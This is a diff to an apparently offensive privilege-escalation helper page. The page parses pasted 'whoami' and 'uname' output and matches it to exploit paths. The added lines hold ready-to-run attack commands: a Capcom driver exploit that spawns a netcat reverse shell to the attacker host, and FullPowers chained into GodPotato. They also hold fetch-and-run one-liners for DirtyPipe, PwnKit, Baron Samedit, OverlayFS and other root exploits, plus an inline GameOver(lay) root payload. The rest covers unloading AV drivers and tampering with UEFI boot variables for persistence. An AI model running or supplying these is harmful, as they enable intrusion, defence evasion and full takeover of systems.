@@ -457,7 +457,7 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
     </div>
     <div class="modal-body">
       <div class="si-msg warn" style="margin-bottom:10px">Accepts: <code>systeminfo</code> &nbsp;|&nbsp; <code>whoami /all</code> or <code>whoami /priv</code> &nbsp;|&nbsp; <code>uname -a</code> &nbsp;|&nbsp; <code>cat /etc/os-release</code> — auto-detects the type</div>
-      <textarea class="si-textarea" id="si-input" style="height:160px" placeholder="Paste ANY of these outputs:&#10;&#10;  systeminfo&#10;  whoami /all  (or whoami /priv)&#10;  uname -a&#10;  cat /etc/os-release&#10;&#10;Auto-detects input type and shows exploit paths instantly." oninput="siAutoDetect()"></textarea>
+      <textarea class="si-textarea" id="si-input" style="height:160px" placeholder="Paste ANY of these and press Analyze:&#10;&#10;  systeminfo              → Windows CVE matching&#10;  whoami /all             → Token privilege exploit matching&#10;  whoami /priv            → Quick privilege analysis&#10;  uname -a                → Linux kernel CVE matching&#10;&#10;&#9888; Paste the OUTPUT of the command, not the command itself." oninput="siAutoDetect()"></textarea>
       <button class="si-btn" onclick="parseSI()">&#9989; Analyze</button>
       <div id="si-output"><div class="si-placeholder">Paste output above and click Analyze — supports systeminfo, whoami /all, whoami /priv, uname -a</div></div>
     </div>
@@ -2363,13 +2363,12 @@ ren Utilman.old Utilman.exe
 <pre class="cmd">whoami /priv | findstr SeLoadDriver</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Step 1: Download tools — vulnerable driver + loader + exploit</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/Capcom.sys -Outfile {{WPATH}}\Capcom.sys
-iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/eoploaddriver.exe -Outfile {{WPATH}}\eoploaddriver.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/eoploaddriver_x64.exe -Outfile {{WPATH}}\eoploaddriver_x64.exe
 iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -Outfile {{WPATH}}\ExploitCapcom.exe</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Step 2: Load the vulnerable driver via registry (no admin required with SeLoadDriver)</div>
-<pre class="cmd">{{WPATH}}\eoploaddriver.exe System\CurrentControlSet\dfserv {{WPATH}}\Capcom.sys</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">Step 3: Exploit the loaded driver to get SYSTEM shell</div>
-<pre class="cmd">{{WPATH}}\ExploitCapcom.exe LOAD {{WPATH}}\Capcom.sys
-{{WPATH}}\ExploitCapcom.exe</pre></div>
+<pre class="cmd">{{WPATH}}\eoploaddriver_x64.exe System\CurrentControlSet\dfserv {{WPATH}}\Capcom.sys</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Step 3: Exploit the loaded driver — spawn SYSTEM shell (k4sth4 fork: EXPLOIT syntax)</div>
+<pre class="cmd">{{WPATH}}\ExploitCapcom.exe EXPLOIT "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Alternative: Unload security/monitoring drivers with fltMC (disables some AV)</div>
 <pre class="cmd"># List loaded drivers:
 fltMC
@@ -6651,9 +6650,14 @@ const TOOL_MAP = {
   'SeManageVolumeExploit.exe':'windows/SeManageVolumeExploit.exe',
   'SeRestoreAbuse.exe':'windows/SeRestoreAbuse.exe',
   'SeDebugPrivesc.exe':'windows/SeDebugPrivesc.exe',
-  'eoploaddriver.exe':'windows/eoploaddriver.exe',
+  'eoploaddriver_x64.exe':'windows/eoploaddriver_x64.exe',
   'ExploitCapcom.exe':'windows/ExploitCapcom.exe',
   'Capcom.sys':'windows/Capcom.sys',
+  'SeBackupPrivilegeCmdLets.dll':'windows/SeBackupPrivilegeCmdLets.dll',
+  'SeBackupPrivilegeUtils.dll':'windows/SeBackupPrivilegeUtils.dll',
+  'TcbElevation.exe':'windows/TcbElevation.exe',
+  'GodPotato-NET35.exe':'windows/GodPotato-NET35.exe',
+  'SigmaPotatoCore.exe':'windows/SigmaPotatoCore.exe',
   'accesschk.exe':'windows/accesschk.exe',
   'laZagne.exe':'windows/LaZagne.exe',
   'SessionGopher.ps1':'scripts/SessionGopher.ps1',
@@ -6955,7 +6959,7 @@ const WIN_BUILDS_MAP = {
   7601:'Win7 / Server 2008 R2',9200:'Windows 8 / Server 2012',9600:'Win8.1 / Server 2012 R2',
   14393:'Win10 1607 / Server 2016',15063:'Win10 1703',16299:'Win10 1709',17134:'Win10 1803',
   17763:'Win10 1809 / Server 2019',18362:'Win10 1903',18363:'Win10 1909',
-  19041:'Win10 2004',19042:'Win10 20H2',19043:'Win10 21H1',19044:'Win10 21H2',
+  19041:'Win10 2004',19042:'Win10 20H2',19043:'Win10 21H1',19044:'Win10 21H2',19045:'Win10 22H2',
   20348:'Windows Server 2022',22000:'Win11 21H2',22621:'Win11 22H2',22631:'Win11 23H2'
 };
 
@@ -7056,21 +7060,54 @@ const WIN_VULNS = [
 ];
 
 const LIN_VULNS = [
-  {name:'DirtyPipe',cve:'CVE-2022-0847',minK:[5,8,0],maxK:[5,16,11],sev:'c',section:'lin-kernel',
+  // DirtyPipe: 5.8.0 ≤ kernel < 5.16.11 / 5.15.25 / 5.10.102
+  // Use maxK [5,16,10] as a conservative upper ceiling (anything ≥ 5.16.11 excluded by range check)
+  // Special 5.15.x / 5.10.x LTS boundary is handled inline in parseSILinux()
+  {name:'DirtyPipe',cve:'CVE-2022-0847',minK:[5,8,0],maxK:[5,16,10],sev:'c',section:'lin-kernel',
    desc:'Pipe splice → overwrite read-only files. SUID binary overwrite → instant root.',
-   check:'Vulnerable: 5.8.0 – 5.16.11 (also some 5.15.x LTS). Check: uname -r'},
-  {name:'DirtyCow',cve:'CVE-2016-5195',minK:[2,6,22],maxK:[4,8,3],sev:'h',section:'lin-kernel',
+   check:'Vulnerable: 5.8.0 ≤ kernel &lt; 5.16.11 / &lt; 5.15.25 / &lt; 5.10.102. Confirm with: uname -r',
+   dl:'wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.sh && chmod +x exploit-1.sh && ./exploit-1.sh',
+   link:'https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits'},
+  {name:'DirtyCow',cve:'CVE-2016-5195',minK:[2,6,22],maxK:[4,8,2],sev:'h',section:'lin-kernel',
    desc:'Race condition in CoW — write to read-only mmap. Stable PoC: dirtycow.ninja',
-   check:'Vulnerable: 2.6.22 – 4.8.3. Check: uname -r'},
+   check:'Vulnerable: 2.6.22 – 4.8.2. Confirm with: uname -r',
+   dl:'wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty',
+   link:'https://github.com/firefart/dirtycow'},
   {name:'PwnKit (polkit)',cve:'CVE-2021-4034',minK:[0,0,0],maxK:[99,99,99],sev:'c',section:'lin-kernel',
-   desc:'pkexec universal LPE — polkit < 0.120 on ALL kernel versions. Not a kernel bug.',
-   check:'dpkg -l policykit-1 | awk "/policykit/{print $3}" — or — rpm -qi polkit | grep Version'},
+   desc:'pkexec universal LPE — polkit &lt; 0.120 on ALL kernel versions. Not a kernel bug.',
+   check:'dpkg -l policykit-1 | awk \'/policykit/{print $3}\' — or — rpm -qi polkit | grep Version',
+   dl:'wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit && chmod +x PwnKit && ./PwnKit',
+   link:'https://github.com/ly4k/PwnKit'},
   {name:'Baron Samedit (sudo)',cve:'CVE-2021-3156',minK:[0,0,0],maxK:[99,99,99],sev:'c',section:'lin-kernel',
-   desc:'sudo heap overflow — sudo < 1.9.5p2. Works without any sudo rights.',
-   check:'sudo --version | head -1 — vulnerable if < 1.9.5p2'},
+   desc:'sudo heap overflow — sudo &lt; 1.9.5p2. Works without any sudo rights.',
+   check:'sudo --version | head -1 — vulnerable if &lt; 1.9.5p2',
+   dl:'git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit && cd Sudo-1.8.31-Root-Exploit && make && ./exploit',
+   link:'https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit'},
   {name:'Polkit D-Bus Race',cve:'CVE-2021-3560',minK:[0,0,0],maxK:[99,99,99],sev:'h',section:'lin-kernel',
-   desc:'polkit authentication bypass via D-Bus message timing — polkit < 0.119.',
-   check:'Affects: RHEL 8, Fedora 34, Ubuntu 20.04 LTS (specific package versions)'},
+   desc:'polkit authentication bypass via D-Bus message timing — polkit &lt; 0.119.',
+   check:'Affects: RHEL 8, Fedora 34, Ubuntu 20.04 LTS (specific package versions)',
+   dl:'wget https://raw.githubusercontent.com/hakivvi/CVE-2021-3560/main/exploit.sh && chmod +x exploit.sh && ./exploit.sh',
+   link:'https://github.com/hakivvi/CVE-2021-3560'},
+  {name:'nftables LPE',cve:'CVE-2022-2586',minK:[5,4,0],maxK:[5,19,99],sev:'h',section:'lin-kernel',
+   desc:'Use-after-free in netfilter nftables — kernels 5.4–5.19 (Ubuntu 20.04/22.04 affected).',
+   check:'uname -r — vulnerable: 5.4.0–5.19.x. Requires unprivileged user namespaces (default on Ubuntu).',
+   dl:'# PoC: https://github.com/theori-io/CVE-2022-2586',
+   link:'https://github.com/theori-io/CVE-2022-2586'},
+  {name:'OverlayFS LPE',cve:'CVE-2023-0386',minK:[5,11,0],maxK:[6,1,99],sev:'h',section:'lin-kernel',
+   desc:'FUSE + OverlayFS file capability bypass — kernels &lt; 6.2 (Ubuntu 22.04 before 5.15.0-70).',
+   check:'uname -r — Ubuntu 22.04: vulnerable if kernel &lt; 5.15.0-70. Requires unprivileged user namespaces.',
+   dl:'git clone https://github.com/xkaneiki/CVE-2023-0386 && cd CVE-2023-0386 && make all && ./exp',
+   link:'https://github.com/xkaneiki/CVE-2023-0386'},
+  {name:'GameOver(lay)',cve:'CVE-2023-2640',minK:[5,15,0],maxK:[6,1,99],sev:'h',section:'lin-kernel',
+   desc:'Ubuntu-specific OverlayFS — set arbitrary file capabilities → SUID root. Ubuntu 22.04 / 23.04.',
+   check:'uname -r + uname -v — must be Ubuntu 22.04 or 23.04 kernel &lt; 6.2.0',
+   dl:'unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c \\"import os;os.setuid(0);os.system(\'id;bash\')\\"" 2>/dev/null',
+   link:'https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629'},
+  {name:'GameOver(lay) pair',cve:'CVE-2023-32629',minK:[5,15,0],maxK:[6,1,99],sev:'h',section:'lin-kernel',
+   desc:'Companion to CVE-2023-2640 — Ubuntu kernel OverlayFS. Same conditions, used together.',
+   check:'uname -r — Ubuntu 22.04/23.04 kernel &lt; 6.2.0. Used together with CVE-2023-2640.',
+   dl:'git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 && cd CVE-2023-2640-CVE-2023-32629 && bash exploit.sh',
+   link:'https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629'},
 ];
 
 // ═══════════════════════════════════════════════════════════════
@@ -7174,8 +7211,8 @@ const PRIV_EXPLOITS = {
     sev:'h', section:'win-exploits',
     summary:'Load kernel driver without admin → load vulnerable signed driver → kernel exploit → SYSTEM.',
     tools:[
-      {name:'EOPLOADDRIVER.exe', note:'Load driver via registry without admin', cmd:'{{WPATH}}\\EOPLOADDRIVER.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys', link:'https://github.com/TarlogicSecurity/EoPLoadDriver'},
-      {name:'ExploitCapcom.exe', note:'Exploit loaded Capcom driver', cmd:'{{WPATH}}\\ExploitCapcom.exe EXPLOITPATH {{WPATH}}\\shell.exe', link:'https://github.com/tandasat/ExploitCapcom'},
+      {name:'eoploaddriver_x64.exe', note:'Load driver via registry without admin (k4sth4 precompiled)', cmd:'{{WPATH}}\\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys', link:'https://github.com/k4sth4/SeLoadDriverPrivilege'},
+      {name:'ExploitCapcom.exe', note:'Exploit loaded Capcom driver → SYSTEM (k4sth4 fork, EXPLOIT syntax)', cmd:'{{WPATH}}\\ExploitCapcom.exe EXPLOIT "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/k4sth4/SeLoadDriverPrivilege'},
       {name:'fltMC unload', note:'Side effect: unload security/AV drivers', cmd:'fltMC unload sysmondrv', link:''},
     ],
     warning:'Print Operators group also gets SeLoadDriverPrivilege. Clean up: reg delete HKLM\\System\\CurrentControlSet\\dfserv /f',
@@ -7227,6 +7264,34 @@ const PRIV_EXPLOITS = {
     ],
     detect:'whoami /priv | findstr SeCreateSymbolic'
   },
+  'SeRelabelPrivilege': {
+    sev:'m', section:'win-exploits',
+    summary:'Change integrity levels on objects → elevate a process or file to High/System integrity → bypass mandatory integrity control.',
+    tools:[
+      {name:'PrivFu suite (IntegrityLevel)', note:'Enumerate and relabel objects via SeRelabelPrivilege', cmd:'{{WPATH}}\\SetIntegrityLevel.exe high {{WPATH}}\\shell.exe', link:'https://github.com/daem0nc0re/PrivFu'},
+      {name:'Manual SACL manipulation', note:'Use icacls to set high-integrity label on a writable SYSTEM service binary path', cmd:'icacls C:\\Temp\\shell.exe /setintegritylevel High', link:''},
+      {name:'Custom C (NtSetSecurityObject)', note:'SetSecurityInfo with LABEL_SECURITY_INFORMATION to set mandatory label', cmd:'# Compile custom tool — see: https://github.com/hatRiot/token-priv', link:'https://github.com/hatRiot/token-priv'},
+    ],
+    warning:'Rarely assigned directly. Most impactful when combined with a writable path to a SYSTEM-owned process. Confirm with: whoami /priv',
+    detect:'whoami /priv | findstr SeRelabel'
+  },
+  'SeSystemEnvironmentPrivilege': {
+    sev:'h', section:'win-exploits',
+    summary:'Modify UEFI/EFI firmware environment variables → persistent UEFI implant or boot-order manipulation → survives OS reinstall.',
+    tools:[
+      {name:'RWEverything (RWE.exe)', note:'GUI tool to read/write EFI vars directly', cmd:'{{WPATH}}\\RWE.exe', link:'https://rweverything.com/'},
+      {name:'PowerShell Get/Set-FirmwareEnvironmentVariable', note:'Built-in API — requires privilege', cmd:'[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()', link:''},
+      {name:'efivar (concept)', note:'Note: primarily a persistence/covert technique, not instant SYSTEM. Combine with other privs.', cmd:'powershell -c "Add-Type -Name EFI -Namespace Win32 -MemberDefinition \'[DllImport(\\\"kernel32\\\")]\npublic static extern bool SetFirmwareEnvironmentVariable(string lpName,string lpGuid,byte[] pBuffer,uint nSize);\'; [Win32.EFI]::SetFirmwareEnvironmentVariable(\\\"BootOrder\\\",\\\"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}\\\",@(0,0),2)"', link:''},
+    ],
+    steps:[
+      '1. Verify privilege is enabled: whoami /priv | findstr SeSystemEnvironment',
+      '2. Use RWEverything to enumerate and modify EFI boot variables',
+      '3. For persistence: plant a malicious EFI boot entry pointing to attacker DLL',
+      '4. More immediately useful: combine with SeLoadDriverPrivilege for kernel-level persistence',
+    ],
+    warning:'Primarily a persistence/evasion technique. Does not give immediate SYSTEM on its own. Most impactful on physical-access or long-term implant scenarios.',
+    detect:'whoami /priv | findstr SeSystemEnvironment'
+  },
 };
 
 // Groups that imply specific attack paths
@@ -7254,7 +7319,7 @@ const GROUP_EXPLOITS = {
   'print operators': {
     sev:'h', section:'win-exploits',
     summary:'Gets SeLoadDriverPrivilege → load vulnerable kernel driver (Capcom/szkg64) → SYSTEM.',
-    tool:'EOPLOADDRIVER.exe + ExploitCapcom.exe',
+    tool:'eoploaddriver_x64.exe + ExploitCapcom.exe',
     link:'https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/'
   },
   'administrators': {
@@ -7266,70 +7331,137 @@ const GROUP_EXPLOITS = {
 };
 
 function parseTokenPrivs(raw, out) {
-  // Extract username + hostname if present
+  // ── STEP 0: Wrong-paste detection ──────────────────────────────────────────
+  // Detect if the user pasted a command instead of its output.
+  // Heuristic: starts with a known shell token AND paste is short (<6 lines).
+  const trimmed = raw.trim();
+  const lineCount = trimmed.split('\n').length;
+  if (lineCount < 6 && /^(whoami|iwr |curl |wget |Invoke-WebRequest|\.\\\S+\.exe|powershell |cmd\.exe|net use|certutil)/im.test(trimmed)) {
+    out.innerHTML = '<div class="si-msg warn">&#9888; This looks like a <strong>command</strong>, not its output. Run it in your shell first, then paste the <em>result</em> here.<br><br>Quick reference:<br><code>whoami /priv</code> — privileges only<br><code>whoami /all</code> — full token (user + groups + privs)</div>';
+    return;
+  }
+  // Catch very short pastes with no recognisable whoami token data
+  if (lineCount < 3 && !/Se\w+Privilege|PRIVILEGES INFORMATION|GROUP INFORMATION|User Name/i.test(trimmed)) {
+    out.innerHTML = '<div class="si-msg warn">&#9888; Input too short or not recognised as <code>whoami</code> output. Paste the full output of <code>whoami /priv</code> or <code>whoami /all</code>.</div>';
+    return;
+  }
+
+  // ── STEP 1: Extract username if present ────────────────────────────────────
   const userM = raw.match(/User Name\s+SID\s*[-=\s]+([\w\\.\-@]+)\s+(S-\d[-\d]+)/i)
               || raw.match(/^([\w\\.\-@]+)\s+(S-1-5[-\d]+)/m);
   const userName = userM ? userM[1].trim() : null;
 
-  // Extract all privilege lines: "PrivilegeName   Description   State"
+  // ── STEP 2: Parse privilege lines ──────────────────────────────────────────
+  // Primary regex: standard 3-column format — two or more spaces separate columns.
+  // Handles: "SeXxxPrivilege    <description text>    Enabled|Disabled"
   const privLines = [];
-  const privRe = /^(Se\w+Privilege)\s+.+?(Enabled|Disabled)/gim;
+  const seen = new Set();
+  const privRe = /^(Se\w+(?:Privilege)?)\s{2,}.+?\s{2,}(Enabled|Disabled)\s*$/gim;
   let m;
   while ((m = privRe.exec(raw)) !== null) {
-    privLines.push({name: m[1], enabled: m[2].toLowerCase() === 'enabled'});
-  }
-
-  // Also catch lines without description column (whoami /priv simple format)
-  if (privLines.length === 0) {
-    const simple = /^(Se\w+Privilege)\b/gim;
-    while ((m = simple.exec(raw)) !== null) {
-      if (!privLines.find(p => p.name === m[1]))
-        privLines.push({name: m[1], enabled: true});
+    if (!seen.has(m[1])) {
+      seen.add(m[1]);
+      privLines.push({name: m[1], enabled: m[2].toLowerCase() === 'enabled'});
     }
   }
 
-  // Extract group memberships from "GROUP INFORMATION" block
+  // Fallback: looser — single space separations (Server format / tight columns)
+  if (privLines.length === 0) {
+    const looseRe = /^(Se\w+(?:Privilege)?)\b.*?\b(Enabled|Disabled)\s*$/gim;
+    while ((m = looseRe.exec(raw)) !== null) {
+      if (!seen.has(m[1])) {
+        seen.add(m[1]);
+        privLines.push({name: m[1], enabled: m[2].toLowerCase() === 'enabled'});
+      }
+    }
+  }
+
+  // Last-resort: privilege name only, assume enabled (malformed or truncated input)
+  if (privLines.length === 0) {
+    const nameOnly = /^(Se\w+(?:Privilege)?)\b/gim;
+    while ((m = nameOnly.exec(raw)) !== null) {
+      if (!seen.has(m[1])) {
+        seen.add(m[1]);
+        privLines.push({name: m[1], enabled: true});
+      }
+    }
+  }
+
+  // ── STEP 3: Extract group memberships ──────────────────────────────────────
   const groupBlock = raw.match(/GROUP INFORMATION[\s\S]*?(?=PRIVILEGES INFORMATION|USER CLAIMS|$)/i);
   const userGroups = groupBlock ? groupBlock[0].toLowerCase() : '';
+  const hasGroupInfo = !!groupBlock;
 
-  // Service account detection
-  const isLocalSvc = /nt authority\\local service|local service/i.test(raw);
-  const isNetSvc = /nt authority\\network service|network service/i.test(raw);
+  // ── STEP 4: Service account detection ──────────────────────────────────────
+  const isLocalSvc   = /nt authority\\local service\b/i.test(raw) || /\blocal service\b/i.test(userName || '');
+  const isNetSvc     = /nt authority\\network service\b/i.test(raw) || /\bnetwork service\b/i.test(userName || '');
   const isServiceAcct = isLocalSvc || isNetSvc;
+  const hasImpersonate     = privLines.some(p => p.name === 'SeImpersonatePrivilege');
+  const impersonateEnabled = privLines.some(p => p.name === 'SeImpersonatePrivilege' && p.enabled);
 
-  const sevOrder = {c:0,h:1,m:2,l:3};
+  const sevOrder = {c:0, h:1, m:2, l:3};
 
-  // Build output
+  // ── STEP 5: Build header ────────────────────────────────────────────────────
   let html = '<div class="si-os-header">';
   html += '<div class="si-os-name">&#9889; Token Privilege Analysis</div>';
-  if (userName) html += `<div class="si-build">User: <code>${escHtml(userName)}</code></div>`;
+  if (userName) {
+    html += `<div class="si-build">User: <code>${escHtml(userName)}</code></div>`;
+  } else {
+    html += `<div class="si-build" style="color:var(--text3)">User: <em>not found — paste <code>whoami /all</code> for full context</em></div>`;
+  }
 
-  // Service account warning
+  // ── STEP 6: Service account warnings (three tiers) ─────────────────────────
   if (isServiceAcct) {
-    html += `<div style="margin-top:8px;padding:8px 12px;background:rgba(248,81,73,.12);border:1px solid rgba(248,81,73,.3);border-radius:4px;font-size:12px;color:#ff7b72">
-      <strong>&#9888; SERVICE ACCOUNT DETECTED (${isLocalSvc?'LOCAL SERVICE':'NETWORK SERVICE'})</strong><br>
-      SeImpersonatePrivilege may be stripped from this token. Run <code>FullPowers.exe</code> FIRST:<br>
-      <code style="color:var(--cyan)">iwr http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -o C:\\Temp\\FullPowers.exe; C:\\Temp\\FullPowers.exe -c ".\\GodPotato-NET4.exe -cmd cmd" -z</code>
-    </div>`;
+    if (!hasImpersonate) {
+      // Token is stripped — SeImpersonatePrivilege is completely absent
+      html += `<div style="margin-top:8px;padding:10px 14px;background:rgba(248,81,73,.15);border:1px solid rgba(248,81,73,.4);border-radius:6px;font-size:12px;color:#ff7b72">
+        <strong>&#9888; STRIPPED SERVICE TOKEN — ${isLocalSvc ? 'LOCAL SERVICE' : 'NETWORK SERVICE'}</strong><br>
+        <span style="color:var(--text2)">SeImpersonatePrivilege is <strong>absent</strong> from this token — the OS stripped it. You MUST restore the full token with FullPowers.exe before potatoes will work.</span><br><br>
+        <span style="color:var(--cyan);font-size:11px">Step 1 — Restore token and chain directly into GodPotato:</span><br>
+        <code style="color:var(--green);font-size:11px">iwr http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -o C:\\Temp\\fp.exe; C:\\Temp\\fp.exe -c "C:\\Temp\\GodPotato-NET4.exe -cmd cmd" -z</code><br><br>
+        <span style="color:var(--cyan);font-size:11px">Or: get upgraded shell, then re-paste whoami /all output:</span><br>
+        <code style="color:var(--green);font-size:11px">C:\\Temp\\fp.exe -c "C:\\Temp\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z</code>
+      </div>`;
+    } else if (!impersonateEnabled) {
+      // Present but disabled — token partially stripped
+      html += `<div style="margin-top:8px;padding:10px 14px;background:rgba(248,81,73,.12);border:1px solid rgba(248,81,73,.3);border-radius:6px;font-size:12px;color:#ff7b72">
+        <strong>&#9888; SERVICE ACCOUNT (${isLocalSvc ? 'LOCAL SERVICE' : 'NETWORK SERVICE'}) — SeImpersonatePrivilege DISABLED</strong><br>
+        <span style="color:var(--text2)">Privilege is present but disabled. Most potato tools auto-enable it via AdjustTokenPrivileges. If they fail, restore the full token first:</span><br>
+        <code style="color:var(--cyan);font-size:11px">iwr http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -o C:\\Temp\\fp.exe; C:\\Temp\\fp.exe -c "C:\\Temp\\GodPotato-NET4.exe -cmd cmd" -z</code>
+      </div>`;
+    } else {
+      // Present and enabled — standard reminder
+      html += `<div style="margin-top:8px;padding:8px 12px;background:rgba(248,81,73,.10);border:1px solid rgba(248,81,73,.25);border-radius:4px;font-size:12px;color:#ff7b72">
+        <strong>&#9888; SERVICE ACCOUNT — SeImpersonatePrivilege ENABLED</strong><br>
+        <span style="color:var(--text2)">Token looks intact. Proceed with a potato below. If it fails, try FullPowers first:</span><br>
+        <code style="color:var(--cyan);font-size:11px">C:\\Temp\\FullPowers.exe -c "C:\\Temp\\GodPotato-NET4.exe -cmd cmd" -z</code>
+      </div>`;
+    }
   }
 
   if (privLines.length === 0) {
-    html += '</div><div class="si-msg warn">&#9888; No privilege lines found. Paste the output of <code>whoami /priv</code> or <code>whoami /all</code>.</div>';
+    html += '</div><div class="si-msg warn">&#9888; No privilege lines detected. Ensure you paste the output of <code>whoami /priv</code> or <code>whoami /all</code>.<br>Expected: lines starting with <code>Se...</code> followed by a description and <code>Enabled</code> or <code>Disabled</code>.</div>';
     out.innerHTML = html;
     return;
   }
 
-  html += `<div class="si-arch">${privLines.length} privileges found — ${privLines.filter(p=>p.enabled).length} enabled, ${privLines.filter(p=>!p.enabled).length} disabled (disabled can be re-enabled)</div>`;
+  const enabledCount  = privLines.filter(p =>  p.enabled).length;
+  const disabledCount = privLines.filter(p => !p.enabled).length;
+  html += `<div class="si-arch">${privLines.length} privileges — <span style="color:var(--green)">${enabledCount} enabled</span>, <span style="color:var(--orange)">${disabledCount} disabled</span> <span style="color:var(--text3);font-size:10px">(disabled privs are still exploitable — tools call AdjustTokenPrivileges() internally)</span></div>`;
+
+  if (!hasGroupInfo) {
+    html += `<div style="margin-top:6px;padding:5px 10px;background:var(--bg4);border-radius:4px;font-size:11px;color:var(--text3)">&#8505; Group membership not included. Run <code>whoami /all</code> to add group analysis (Backup Operators, DnsAdmins, Server Operators, etc.).</div>`;
+  }
+
   html += '</div>';
 
-  // Sort: critical exploitable first
+  // ── STEP 7: Sort matched privs — enabled critical first ────────────────────
   const matched = privLines
     .map(p => ({...p, exploit: PRIV_EXPLOITS[p.name]}))
     .filter(p => p.exploit)
-    .sort((a,b) => {
-      // enabled+critical first
-      const aScore = (a.enabled ? 0 : 1) + (sevOrder[a.exploit.sev]||3)*2;
-      const bScore = (b.enabled ? 0 : 1) + (sevOrder[b.exploit.sev]||3)*2;
+    .sort((a, b) => {
+      const aScore = (a.enabled ? 0 : 10) + (sevOrder[a.exploit.sev] || 3) * 2;
+      const bScore = (b.enabled ? 0 : 10) + (sevOrder[b.exploit.sev] || 3) * 2;
       return aScore - bScore;
     });
 
@@ -7337,58 +7469,79 @@ function parseTokenPrivs(raw, out) {
 
   let html2 = '<div class="si-vulns">';
 
-  // Group membership hits
+  // ── STEP 8: Group membership cards ─────────────────────────────────────────
   Object.entries(GROUP_EXPLOITS).forEach(([grp, info]) => {
     if (userGroups.includes(grp)) {
+      const sevLabel = info.sev === 'c' ? 'CRITICAL' : info.sev === 'h' ? 'HIGH' : info.sev === 'm' ? 'MEDIUM' : 'LOW';
       html2 += `<div class="si-card sv-vuln">
         <div class="si-vtop">
-          <span class="si-vname">&#128101; ${grp.charAt(0).toUpperCase()+grp.slice(1)} Group</span>
-          <span class="si-stag s${info.sev}">${info.sev==='c'?'CRITICAL':'HIGH'}</span>
-          <span class="si-vstatus">&#9888; EXPLOITABLE</span>
+          <span class="si-vname">&#128101; ${escHtml(grp.charAt(0).toUpperCase() + grp.slice(1))} Group</span>
+          <span class="si-stag s${info.sev}">${sevLabel}</span>
+          <span class="si-vstatus">&#9888; EXPLOITABLE (GROUP)</span>
         </div>
-        <div class="si-vdesc">${info.summary}</div>
-        ${info.warning?`<div class="si-vcond">&#9888; ${info.warning}</div>`:''}
-        <div style="font-size:11px;color:var(--text2);margin-top:4px">Tool: <code style="color:var(--cyan)">${escHtml(info.tool)}</code>${info.link?` <a href="${info.link}" target="_blank" style="font-size:11px">&#8599;</a>`:''}</div>
-        ${info.section?`<a class="si-goto" href="#${info.section}" onclick="closeModal('si-modal')">&#8594; Jump to section</a>`:''}
+        <div class="si-vdesc">${escHtml(info.summary)}</div>
+        ${info.warning ? `<div class="si-vcond" style="color:var(--orange)">&#9888; ${escHtml(info.warning)}</div>` : ''}
+        <div style="font-size:11px;color:var(--text2);margin-top:6px">
+          <span style="color:var(--text3)">Tool:</span> <code style="color:var(--cyan)">${escHtml(info.tool)}</code>
+          ${info.link ? ` <a href="${escHtml(info.link)}" target="_blank" style="font-size:11px">&#8599;</a>` : ''}
+        </div>
+        ${info.section ? `<a class="si-goto" href="#${info.section}" onclick="closeModal('si-modal')">&#8594; Jump to full section</a>` : ''}
       </div>`;
     }
   });
 
   if (matched.length === 0 && !Object.keys(GROUP_EXPLOITS).some(g => userGroups.includes(g))) {
-    html2 += '<div class="si-msg ok">&#10003; No directly exploitable privileges found in known list. Run winPEAS and PrivescCheck for deeper analysis.</div>';
+    html2 += '<div class="si-msg ok">&#10003; No directly exploitable privileges found in the known list. Run <code>winPEAS.exe</code> and <code>PrivescCheck.ps1</code> for deeper analysis.</div>';
   }
 
+  // ── STEP 9: Per-privilege exploit cards ────────────────────────────────────
   matched.forEach(p => {
     const ex = p.exploit;
     const cls = p.enabled ? 'sv-vuln' : 'sv-check';
-    const sevLabel = ex.sev==='c'?'CRITICAL':ex.sev==='h'?'HIGH':ex.sev==='m'?'MEDIUM':'LOW';
+    const sevLabel = ex.sev === 'c' ? 'CRITICAL' : ex.sev === 'h' ? 'HIGH' : ex.sev === 'm' ? 'MEDIUM' : 'LOW';
+    // Auto-expand steps for enabled critical/high privs
+    const stepsOpen = (p.enabled && (ex.sev === 'c' || ex.sev === 'h')) ? 'open' : '';
+
+    const disabledNote = !p.enabled ? `
+      <div style="margin-top:6px;padding:6px 10px;background:rgba(210,153,34,.10);border:1px solid rgba(210,153,34,.25);border-radius:4px;font-size:11px;color:var(--orange)">
+        &#9744; <strong>Disabled</strong> in your token — still fully exploitable. Most tools re-enable it automatically via <code>AdjustTokenPrivileges()</code>.<br>
+        If a tool fails to self-enable it, force-enable all disabled privs with:<br>
